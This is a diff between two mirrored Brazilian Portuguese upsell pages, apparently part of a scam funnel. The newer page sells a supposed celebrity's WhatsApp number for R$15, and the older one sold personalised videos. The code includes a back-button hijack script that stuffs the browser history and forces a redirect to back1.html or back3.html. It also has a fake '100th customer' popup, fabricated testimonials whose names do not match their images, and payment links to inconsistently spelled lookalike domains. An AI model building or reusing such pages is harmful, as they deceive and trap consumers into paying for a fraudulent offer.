@@ -1,9 +1,10 @@
 <!DOCTYPE html>
 <html lang="pt-br">
 
-<!-- Mirrored from privasimaria.site/app/up1.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Mar 2025 23:19:19 GMT -->
+<!-- Mirrored from privasimaria.site/app/up3.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Mar 2025 23:19:23 GMT -->
 <head>
 
+    
     <script
   src="https://cdn.utmify.com.br/scripts/utms/latest.js"
   data-utmify-prevent-xcod-sck
@@ -17,17 +18,13 @@
   a.setAttribute("async", "");
   a.setAttribute("defer", "");
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  a.onerror = function() {
-    console.warn('Erro ao carregar pixel de tracking - continuando sem tracking');
-  };
   document.head.appendChild(a);
 </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Oferta Especial</title>
-    <link rel="icon" type="image/x-icon" href="../public/images/logo_icon_branco.png">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <style>
         :root {
             --color-primary-start: #F58370;
@@ -99,9 +96,9 @@
             box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.1);
             margin: 30px auto;
             max-width: 700px;
-            transition: transform 0.3s ease;
-            width: 100%;
-            box-sizing: border-box;
+            transition: transform 0.3s ease; 
+           margin-right: 10px;
+           margin-left: 10px;  
         }
         .offer-container:hover {
             transform: translateY(-5px);
@@ -164,9 +161,8 @@
             margin-right: 10px;
         }
         .new-price {
-            background: linear-gradient(to right, var(--color-primary-start), var(--color-primary-end));
+            background: #4AC95A;
             -webkit-background-clip: text;
-            background-clip: text;
             -webkit-text-fill-color: transparent;
             font-size: 32px;
             font-weight: bold;
@@ -185,8 +181,6 @@
             transition: all 0.3s ease;
             border: none;
             margin-bottom: 40px;
-            cursor: pointer;
-            width: auto;
         }
         .btn-upsell:hover {
             transform: translateY(-3px);
@@ -280,6 +274,68 @@
         .gallery-item:hover img {
             transform: scale(1.1);
         }
+        .comments {
+            background: #fff;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0px 8px 20px rgba(0, 0, 0, 0.1);
+            margin: 30px auto;
+            max-width: 700px;
+            text-align: left;
+            margin-right: 10px;
+            margin-left: 10px;  
+        }
+        .comments-title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            color: #333;
+            display: flex;
+            align-items: center;
+        }
+        .comments-icon {
+            color: var(--color-primary-start);
+            margin-right: 10px;
+            font-size: 24px;
+        }
+        .comment {
+            border-bottom: 1px solid #eee;
+            padding: 15px 0;
+            display: flex;
+            align-items: flex-start;
+        }
+        .comment:last-child {
+            border-bottom: none;
+        }
+        .comment-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            overflow: hidden;
+            margin-right: 15px;
+            box-shadow: 0 3px 6px rgba(0, 0, 0, 0.1);
+        }
+        .comment-avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .comment-content {
+            flex: 1;
+        }
+        .comment-author {
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #333;
+        }
+        .comment-text {
+            color: #666;
+            line-height: 1.5;
+        }
+        .comment-rating {
+            color: #FFB443;
+            margin-top: 5px;
+        }
         .guarantee-section {
             background: #f9f9f9;
             border-radius: 10px;
@@ -294,7 +350,6 @@
             font-size: 40px;
             background: linear-gradient(to right, var(--color-primary-start), var(--color-primary-end));
             -webkit-background-clip: text;
-            background-clip: text;
             -webkit-text-fill-color: transparent;
             margin-right: 15px;
         }
@@ -322,223 +377,65 @@
             border-radius: 9px;
             padding: 15px;
         }
-        
-        /* Modal PIX Styles */
-        .pix-modal {
-            display: none;
-            position: fixed;
-            z-index: 10000;
-            left: 0;
-            top: 0;
-            width: 100vw;
-            height: 100vh;
-            background-color: rgba(0, 0, 0, 0.8);
-            animation: fadeIn 0.3s ease;
-            overflow: auto;
-        }
-        
-        .pix-modal-content {
-            background-color: #fff;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            padding: 30px;
-            border-radius: 15px;
-            width: 90%;
-            max-width: 500px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
-            animation: slideIn 0.3s ease;
-            max-height: 90vh;
-            overflow-y: auto;
-        }
-        
-        @keyframes slideIn {
-            from {
-                transform: translateY(-50px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-        
-        .pix-modal-header {
-            margin-bottom: 20px;
-        }
-        
-        .pix-modal-title {
-            font-size: 24px;
-            font-weight: bold;
-            color: #333;
-            margin-bottom: 10px;
-        }
-        
-        .pix-modal-subtitle {
-            color: #666;
-            font-size: 16px;
-        }
-        
-        .pix-amount {
-            font-size: 32px;
-            font-weight: bold;
-            color: var(--color-primary-start);
-            margin: 20px 0;
-        }
-        
-        .pix-qr-container {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 10px;
-            margin: 20px 0;
-        }
-        
-        .pix-qr-code {
-            width: 200px;
-            height: 200px;
-            margin: 0 auto;
-            display: block;
-        }
-        
-        .pix-code-container {
-            margin: 20px 0;
-        }
-        
-        .pix-code-label {
-            font-weight: bold;
-            margin-bottom: 10px;
-            color: #333;
-        }
-        
-        .pix-code-input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-            text-align: center;
-            background: #f8f9fa;
-        }
-        
-        .pix-copy-btn {
-            background: linear-gradient(to right, var(--color-primary-start), var(--color-primary-end));
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 10px 5px;
-            transition: all 0.3s ease;
-        }
-        
-        .pix-copy-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(245, 131, 112, 0.4);
-        }
-        
-        .pix-close-btn {
-            background: #6c757d;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            margin: 10px 5px;
-            transition: all 0.3s ease;
-        }
-        
-        .pix-close-btn:hover {
-            background: #5a6268;
-            transform: translateY(-2px);
-        }
-        
-        .pix-instructions {
-            background: #e3f2fd;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 20px 0;
-            text-align: left;
-        }
-        
-        .pix-instructions h4 {
-            color: #1976d2;
-            margin-bottom: 10px;
-        }
-        
-        .pix-instructions ol {
-            margin: 0;
-            padding-left: 20px;
-        }
-        
-        .pix-instructions li {
-            margin-bottom: 5px;
-            color: #333;
-        }
     </style>
-    <script>
-        // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
-        const link = 'back1.html';
-      
-        function setBackRedirect(url) {
-          let urlBackRedirect = url;
-          urlBackRedirect = urlBackRedirect =
-            urlBackRedirect.trim() +
-            (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
-            document.location.search.replace('?', '').toString();
-      
-          history.pushState({}, '', location.href);
-          history.pushState({}, '', location.href);
-          history.pushState({}, '', location.href);
-      
-          window.addEventListener('popstate', () => {
-            console.log('onpopstate', urlBackRedirect);
-            setTimeout(() => {
-              location.href = urlBackRedirect;
-            }, 1);
-          });
-        }
-      
-        setBackRedirect(link);
-      </script>
+
+<script>
+    // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+    const link = 'back3.html';
+  
+    function setBackRedirect(url) {
+      let urlBackRedirect = url;
+      urlBackRedirect = urlBackRedirect =
+        urlBackRedirect.trim() +
+        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+        document.location.search.replace('?', '').toString();
+  
+      history.pushState({}, '', location.href);
+      history.pushState({}, '', location.href);
+      history.pushState({}, '', location.href);
+  
+      window.addEventListener('popstate', () => {
+        console.log('onpopstate', urlBackRedirect);
+        setTimeout(() => {
+          location.href = urlBackRedirect;
+        }, 1);
+      });
+    }
+  
+    setBackRedirect(link);
+  </script>
 </head>
 <body>
     <div class="header">
         <div class="logo">
-            <img src="../public/images/logo.svg" alt="Logo">
+            <img src="logosem.png" alt="Logo">
         </div>
     </div>
 
     <div id="popup" class="popup">
         <div class="popup-content">
-            <h2>Parabéns!</h2>
-            <p>Você é o 100° cliente a adquirir esta promoção e ganhou um presente especial exclusivo!</p>
-            <button class="btn-upsell" onclick="revealOffer()">Revelar Meu Presente</button>
+            <h2>Dentro de 1 hora ela ligará!</h2>
+            <p>Está com pressa? obtenha agora o número para você mesmo poder ligar!</p>
+            <button class="btn-upsell" onclick="revealOffer()">Revelar Telefone</button>
         </div>
     </div>
 
     <div id="upsell-content" class="hidden">
         <div class="offer-container">
             <div class="offer-image">
-                <img id="upsell-image" src="../public/images/perfil.jpg" alt="Oferta Especial">
+                <img id="upsell-image" src="./Untitled-image-5.jpg" alt="Oferta Especial">
                 <div class="discount-badge">50% OFF</div>
             </div>
             
-            <h1 class="offer-title">Seu Presente Exclusivo!</h1>
-            <h2 class="offer-subtitle">Uma oportunidade de você pedir para a Vírginia o que quiser</h2>
+            <h1 class="offer-title">Fale Agora Mesmo</h1>
+            <h2 class="offer-subtitle">A fila de chamadas é muito grande, obtenha o número do whatsapp para você mesmo ligar!</h2>
             
             <div class="offer-text" id="upsell-text">
                 Aproveite esta oferta exclusiva por tempo limitado!
             </div>
             
             <div class="price-container">
-                <span class="old-price">R$ 397,00</span>
-                <span class="new-price">R$ 17,00</span>
+                <span class="new-price">R$ 15,00</span>
             </div>
             
             <div class="timer-container">
@@ -578,7 +475,7 @@
                 </div>
             </div>
             
-            <button id="buy-button" class="btn-upsell" type="button">QUERO VÍDEOS PERSONALIZADOS!</button>
+            <a id="buy-button" class="btn-upsell" href="https://pay.assinaturaa-exclusiva.shop/686c108493bcb2cfe7e9cff4">QUERO O WHATSAPP!</a>
             
             <div class="guarantee-section">
                 <div class="guarantee-icon">
@@ -614,52 +511,71 @@
             </div>
         </div> -->
 
+        <div class="comments">
+            <h3 class="comments-title">
+                <span class="comments-icon"><i class="fas fa-comment-alt"></i></span>
+                O que nossos clientes dizem:
+            </h3>
+            
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="coments/271545321_1117982212343686_2003270280594003741_n.jpg" alt="Ana Paula">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-author">Lucas Mendes</div>
+                    <div class="comment-text">"Ter o WhatsApp mudou tudo, agora posso falar quando quiser"</div>
+                    <div class="comment-rating">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="comment">
+                <div class="comment-avatar">
+                    <img src="coments/michel.jpg" alt="Roberto Almeida">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-author">Bento Sales</div>
+                    <div class="comment-text">"Tive que esconder meu celular,recebo conteúdos exclusivos todos os dias"</div>
+                    <div class="comment-rating">
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                        <i class="fas fa-star"></i>
+                    </div>
+                </div>
+            </div>
+            
+                        <div class="comment">
+                            <div class="comment-avatar">
+                                <img src="coments/alexsandro.jpg" alt="Ana Paula">
+                </div>
+                <div class="comment-content">
+                    <div class="comment-author">Rodrigo Monteiro</div>
+                                <div class="comment-text">"A sensação de ter essa proximidade é indescritível, muito humilde, adorei falar com ela, ainda mandou um beijo para minha filha que é fã"</div>
+                                <div class="comment-rating">
+                                    <i class="fas fa-star"></i>
+                                    <i class="fas fa-star"></i>
+                                    <i class="fas fa-star"></i>
+                                    <i class="fas fa-star"></i>
+                                    <i class="fas fa-star-half-alt"></i>
+                                </div>
+                            </div>
+                        </div>
+        </div>
     </div>
-
-    <button id="buy-button-bottom" class="btn-upsell" type="button">QUERO MEUS VÍDEOS!</button>
-</div>
-
-<!-- Modal PIX -->
-<div id="pixModal" class="pix-modal">
-    <div class="pix-modal-content">
-        <div class="pix-modal-header">
-            <h2 class="pix-modal-title">💳 Pagamento via PIX</h2>
-            <p class="pix-modal-subtitle">Escaneie o QR Code ou copie o código PIX</p>
-        </div>
-        
-        <div class="pix-amount">R$ 17,00</div>
-        
-        <div class="pix-qr-container">
-            <canvas id="pixQRCode" class="pix-qr-code"></canvas>
-        </div>
-        
-        <div class="pix-code-container">
-            <label class="pix-code-label">Código PIX (Copie e cole no seu app):</label>
-            <input type="text" id="pixCode" class="pix-code-input" readonly>
-            <button id="copyPixCode" class="pix-copy-btn">📋 Copiar Código</button>
-        </div>
-        
-        <div class="pix-instructions">
-            <h4>📱 Como pagar:</h4>
-            <ol>
-                <li>Abra o app do seu banco</li>
-                <li>Escolha a opção PIX</li>
-                <li>Escaneie o QR Code ou cole o código PIX</li>
-                <li>Confirme o pagamento de R$ 17,00</li>
-            </ol>
-        </div>
-        
-        <div>
-            <button id="closePixModal" class="pix-close-btn">❌ Fechar</button>
-        </div>
-    </div>
+    
+    <a id="buy-button-bottom" class="btn-upsell" href="https://pay.assinatura-exclusiva.shop/686c108493bcb2cfe7e9cff4">FALAR AGORA PELO WHATSAPP</a>
 </div>
 
 <!-- Adicione o jQuery e o Slick Carousel JS -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>
-<!-- QRCode.js para gerar QR Codes -->
-<script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+<script src="../../code.jquery.com/jquery-3.6.0.min.js"></script>
+<script src="../../cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js"></script>
 
 <script>
     function revealOffer() {
@@ -714,13 +630,6 @@
     });
 </script>
 
-<script>
-    // Na página antes do checkout
-    const currentStep = "upsell2"; // ou qualquer valor determinado pela navegação
-    localStorage.setItem('lastStep', currentStep);
-    </script>
-
-
 
     <script>
         function revealOffer() {
@@ -762,127 +671,8 @@
         // document.getElementById('upsell-image').src = "/api/placeholder/700/400";
         // document.getElementById('buy-button').href = "#comprar";
         // document.getElementById('buy-button-bottom').href = "#comprar";
-        
-        // Modal PIX Functions
-        function generatePixCode() {
-            // Código PIX de exemplo - substitua pelo código real do seu gateway
-            const pixCode = '00020126580014BR.GOV.BCB.PIX0136123e4567-e12b-12d1-a456-426614174000520400005303986540517.005802BR5913STELLA BEGHINI6009SAO PAULO61080540900062070503***6304ABCD';
-            return pixCode;
-        }
-        
-        function showPixModal() {
-            const modal = document.getElementById('pixModal');
-            const pixCode = generatePixCode();
-            const pixCodeInput = document.getElementById('pixCode');
-            const qrCanvas = document.getElementById('pixQRCode');
-            
-            // Define o código PIX no input
-            pixCodeInput.value = pixCode;
-            
-            // Verifica se QRCode está disponível
-            if (typeof QRCode === 'undefined') {
-                console.error('QRCode library not loaded');
-                alert('Erro: Biblioteca QRCode não carregada. Recarregue a página.');
-                return;
-            }
-            
-            // Gera o QR Code
-            QRCode.toCanvas(qrCanvas, pixCode, {
-                width: 200,
-                height: 200,
-                color: {
-                    dark: '#000000',
-                    light: '#FFFFFF'
-                }
-            }, function (error) {
-                if (error) {
-                    console.error('Erro ao gerar QR Code:', error);
-                    alert('Erro ao gerar QR Code: ' + error.message);
-                } else {
-                    console.log('QR Code gerado com sucesso');
-                }
-            });
-            
-            // Mostra o modal
-            modal.style.display = 'block';
-        }
-        
-        function hidePixModal() {
-            const modal = document.getElementById('pixModal');
-            modal.style.display = 'none';
-        }
-        
-        function copyPixCode() {
-            const pixCodeInput = document.getElementById('pixCode');
-            pixCodeInput.select();
-            pixCodeInput.setSelectionRange(0, 99999); // Para mobile
-            
-            try {
-                document.execCommand('copy');
-                alert('Código PIX copiado para a área de transferência!');
-            } catch (err) {
-                console.error('Erro ao copiar:', err);
-                // Fallback para navegadores modernos
-                if (navigator.clipboard) {
-                    navigator.clipboard.writeText(pixCodeInput.value).then(function() {
-                        alert('Código PIX copiado para a área de transferência!');
-                    });
-                }
-            }
-        }
-        
-        // Função para aguardar bibliotecas carregarem
-        function waitForLibraries() {
-            return new Promise((resolve) => {
-                const checkLibraries = () => {
-                    if (typeof QRCode !== 'undefined' && typeof $ !== 'undefined') {
-                        console.log('Todas as bibliotecas carregadas com sucesso');
-                        resolve();
-                    } else {
-                        console.log('Aguardando bibliotecas...');
-                        setTimeout(checkLibraries, 100);
-                    }
-                };
-                checkLibraries();
-            });
-        }
-
-        // Event Listeners
-        document.addEventListener('DOMContentLoaded', function() {
-            // Aguarda bibliotecas carregarem
-            waitForLibraries().then(() => {
-                console.log('Inicializando event listeners...');
-                
-                // Botão para abrir modal PIX
-                const buyButtons = document.querySelectorAll('#buy-button, #buy-button-bottom');
-                buyButtons.forEach(button => {
-                    // Remove todos os event listeners existentes
-                    button.onclick = null;
-                    button.addEventListener('click', function(e) {
-                        e.preventDefault();
-                        e.stopPropagation();
-                        console.log('Botão clicado - abrindo modal PIX');
-                        showPixModal();
-                        return false;
-                    });
-                });
-                
-                // Botão para fechar modal
-                document.getElementById('closePixModal').addEventListener('click', hidePixModal);
-                
-                // Botão para copiar código PIX
-                document.getElementById('copyPixCode').addEventListener('click', copyPixCode);
-                
-                // Fechar modal clicando fora dele
-                document.getElementById('pixModal').addEventListener('click', function(e) {
-                    if (e.target === this) {
-                        hidePixModal();
-                    }
-                });
-            });
-        });
     </script>
 </body>
 
-<!-- Mirrored from privasimaria.site/app/up1.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Mar 2025 23:19:22 GMT -->
+<!-- Mirrored from privasimaria.site/app/up3.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Mar 2025 23:19:24 GMT -->
 </html>
